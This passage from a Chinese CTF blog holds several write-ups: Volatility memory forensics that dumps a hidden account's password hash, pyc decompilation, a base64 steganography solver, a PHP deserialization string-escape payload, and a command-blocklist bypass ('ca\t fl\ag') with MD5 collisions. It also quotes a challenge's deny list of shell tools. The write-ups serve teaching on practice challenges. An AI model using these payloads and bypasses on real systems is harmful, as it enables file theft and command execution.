        <content type="html"><![CDATA[<p>取证需要用到的工具：</p><p>volatility、注册表分析工具（WRR）、AXIOM等。</p><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="湖湘杯misc"><a href="#湖湘杯misc" class="headerlink" title="湖湘杯misc"></a>湖湘杯misc</h2><p>首先看一下imageinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  imageinfo</span><br></pre></td></tr></table></figure><p>选择一个supported  profile，这里选第一个不行，所以选第二个Win2003SP2x86</p><p>先扫一下pslist</p><p>volatility -f 用户名注册表.vmem  –profile=Win2003SP2x86 pslist</p><p>除了winlogon.exe之外没啥收获，然后扫一下网络，也没啥收获。</p><p>后面尝试扫描connscan，cmdscan，notepad。</p><p>在扫notepad的时候发现了一些东西，于是尝试扫一下后缀为.txt的文件，看看有没有收获。</p><img src="http://cdn.polowong.top/static/images/hxbmisc1.jpg"><p>发现了一个file.txt，尝试dump到本地。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 dumpfiles -Q 0x000000000412cde0 -D .&#x2F;</span><br></pre></td></tr></table></figure><p>dump下来的文件内容为</p><p>什么？计算机又被不知名账户登录了？明明在计算机管理中没有这个用户，为什么还会被这个用户登录呢？电脑跟前的你能帮我找到原因吗？flag为该用户的用户名以及密码的md5值。</p><p>格式：md5(用户名:密码）</p><p>下面考虑在注册表中找一下隐藏用户。</p><p>首先看一下注册表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hivelist volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hivelist</span><br></pre></td></tr></table></figure><p>发现了SAM表。SAM表是存储了电脑登录用户相关信息的表，尝试dump出SAM表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 dumpregistry -D .&#x2F;</span><br></pre></td></tr></table></figure><p>然后使用注册表分析工具打开。</p><img src="http://cdn.polowong.top/static/images/hxbmisc2.jpg"><p>可以看到很多隐藏账户，一个个看看是否有last logon 这个属性。</p><p>最后找到了用户 FHREhpe，然后再回到volatility里面hashdump 出来关于他的账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">volatility -f 用户名注册表.vmem  --profile&#x3D;Win2003SP2x86 hashdump | grep FHREhpe</span><br><span class="line">有如下数据：</span><br><span class="line">FHREhpe$:1171:70fdb8f853bd427d7584248b8d2c9f9e:f3cf477fc3ea6ec0b3b5887616dd4506:::</span><br></pre></td></tr></table></figure><p>  <em>Windows</em>系统下的<em>hash</em>密码格式为：用户名称*:RID:LM-HASH<em>值</em>:NT-HASH*值 </p><p>获得NT HASH值后可以去md5网站解密，解密后的密码是NIAIWOMA</p><p>然后将其MD5加密后即可获得flag。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.ichunqiu.com/thread-59102-1-1.html">https://bbs.ichunqiu.com/thread-59102-1-1.html</a></p><p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 取证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1104学习笔记</title>
      <link href="2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2020/11/09/1104%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="python文件反编译"><a href="#python文件反编译" class="headerlink" title="python文件反编译"></a>python文件反编译</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000</span><br></pre></td></tr></table></figure><p>使用010editor编辑，paste from hex，然后另存为1.pyc。<br>python安装uncompyle  , pip install uncompyle<br>下面就是 uncompyle 1.pyc&gt;1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="built_in">str</span> = [</span><br><span class="line">     <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">51</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">55</span>, <span class="number">48</span>, <span class="number">51</span>, <span class="number">50</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">49</span>, <span class="number">101</span>, <span class="number">55</span>, <span class="number">125</span>]</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line">flag()</span><br></pre></td></tr></table></figure><p>运行即可获得flag</p><h1 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h1><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><p>直接输入base64隐写后的内容即可</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化专题</title>
      <link href="2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/"/>
      <url>2020/11/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。"><a href="#最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。" class="headerlink" title="最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。"></a>最近对反序列化产生了一些兴趣，所以开此篇内容记录所遇到的反序列化的问题。</h1><h2 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="安洵杯  easy_serialize_php"></a>安洵杯  easy_serialize_php</h2><p>题目代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function &#x3D; @$_GET[&#39;f&#39;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);</span><br><span class="line">    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;</span><br><span class="line">    return preg_replace($filter,&#39;&#39;,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;</span><br><span class="line">$_SESSION[&#39;function&#39;] &#x3D; $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#39;img_path&#39;])&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line">if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;</span><br><span class="line">    highlight_file(&#39;index.php&#39;);</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;</span><br><span class="line">    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!</span><br><span class="line">&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;</span><br><span class="line">    $userinfo &#x3D; unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>大概的流程是从浏览器接受GET方式的function，根据提示在phpinfo里面有东西。</p><p>进入phpinfo后搜索得到 d0g3_f1ag.php这个文件，于是猜测需要通过反序列化构造执行至程序最后一行的file_get_contnets().</p><p>那么看file_get_contents()是对 经过滤后、序列化后的serialize_info的反序列化取其img属性的结果。</p><p>先不管正则过滤，我们的目的是构造一个输入，让img的value为base64加密后的d0g3_f1ag.php。</p><p>目标结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;highlight_file&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>但是正常输入的话我们是无法绕过 img_path 的判定的。</p><p>所以这里根据过滤入手，根据正则表达式以及preg_repace我们可以知道，将一些关键字替换成了无，即去掉。</p><p>这里我们可以使用POST方法，对_SESSION[]数组传参，传入的key为黑名单的值，这样在序列化完之后会吃掉该key的部分value。</p><p>听不懂正常，一开始我也听不懂，我就不像其他博主一样给你用不同的颜色标出来哪里是吃掉的部分了。</p><p>首先要了解php序列化后的语法（这里不赘述）</p><p>我们先随便写写，先POST个_SESSION[flag]=s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p><p>看看结果是什么（把代码拷贝到本地，然后本地运行，echo或者var_dump出来序列化后的结果）：</p><p> a:2:{s:4:””;s:39:”s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} </p><p>但是这样是不能正常反序列化的，因为不符合反序列化的语法规则。根据语法规则知道，如果我们想让img作为key，base64加密后的东西作为value的话，需要让上一个对象是正常的，符合序列化后的字符串的语法。</p><p>从前往后看，第一个对象的key为**”;s:**，这样会导致后面的字符串无法正常地反序列化。</p><p>所以，接下来需要做的是先把第一个对象的key和value补全，让其能正常地反序列化。</p><p>补全第一个key的话，需要让第一个key为**”;s:39:”**，所以需要在POST里面传入_SESSION[flagflag]，这样能吞掉八个位置。正好能让本段话加粗的内容作为第一个key（这里建议自己写写试试，看看是否符合反序列化语法的规则。）</p><p>补全之后<strong>请大家自己var_dump或者输出，我这里不会给出补全后输出的序列化结果。</strong></p><p>补全后发现，第一个对象可以正常序列化了，但是问题就是第二个对象的key成了第一个对象的value。</p><p>所以这里需要给第一个对象补个key，给_SESISON[flagflag]继续传值就可以，具体传什么，为什么要这样传，我也不会说。总之我们的目的是传一个符合序列化格式的value，并且传入后也需要让前后都符合序列化格式。</p><p>随便写一个就好 比如 s:3:”aaa”;  </p><p>首先你把他写进去，然后根据序列化格式在前后添加相关符号。连同刚才写的s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}一起就是_SESSION[flagflag]= s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p><p>现在放进去看看是什么效果。是否能够正常反序列化</p><p>a:2:{s:8:””;s:46:”s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} </p><p>这样发现还是不能正常地反序列化，因为不符合语法。在s:3前缺少上一个字段的闭合”;    加上就好。</p><p>所以最终的payload就是</p><p>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p><p>打过去后查看源码，发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面继续打对应的文件就好了~</p><p>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p><p>打进去即可获得一枚flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯web</title>
      <link href="2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/"/>
      <url>2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/</url>
      
        <content type="html"><![CDATA[<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/Cl0ud/p/12585242.html">https://www.cnblogs.com/Cl0ud/p/12585242.html</a></p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>打开题目，观察URL为<a href="http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=">http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</a></p><p>于是猜测有个文件读取和命令执行，但是文件读取的格式是加密的，考虑base64解密，解密两次后再hex2ascii，可以得到文件名。</p><p>copy大佬的脚本，输入文件名即可得到根据此加密规律加密后的文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">filename = <span class="built_in">input</span>().encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">hex</span> = binascii.b2a_hex(filename)  <span class="comment">#b2a是返回二进制数据的16进制表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>)</span><br><span class="line">base1 = base64.b64encode(<span class="built_in">hex</span>)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line"><span class="built_in">print</span>(base2.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入index.php后可以得到index.php文件名的加密后的名字，放到img里面查看源代码为base64加密的，把base64解密后即可得到index.php的源代码</p><p>index.php源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &quot;success&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>对源码进行审计，重点在命令执行部分。</p><p>命令执行有很多过滤，这里过滤不完全（正则表达式有待学习），可用ca\t%20fl\ag绕过。</p><p>在命令执行前需要满足</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>这里可以考虑fastcoll构造两个hash值相同的二进制文件。</p><p>我这里构造好了，具体的使用方法可以百度fastcoll。</p><p>使用该软件构造好后，使用如下php脚本可以获得urlencode后的md5值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function  readmyfile($path)&#123;</span><br><span class="line">    $fh &#x3D; fopen($path, &quot;rb&quot;);</span><br><span class="line">    $data &#x3D; fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;二进制hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;二进制hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo  &#39;URLENCODE &#39;.  urlencode(readmyfile(&quot;2.txt&quot;));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br><span class="line">echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure><p>下面将这两个MD5值分别给POST的a和b赋值，同时URL的?cmd=ca\t%20fl\ag</p><p>这里我踩了个坑，一开始是GET方式提交请求，然后手动改方法为POST，一直不能成功，后来发现可能是某些请求头的问题，我这里用hackbar发送POST请求，请求体随便写，在BP里面抓包，将请求体的内容改成a和b的值，在此之后即可愉快地命令执行。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 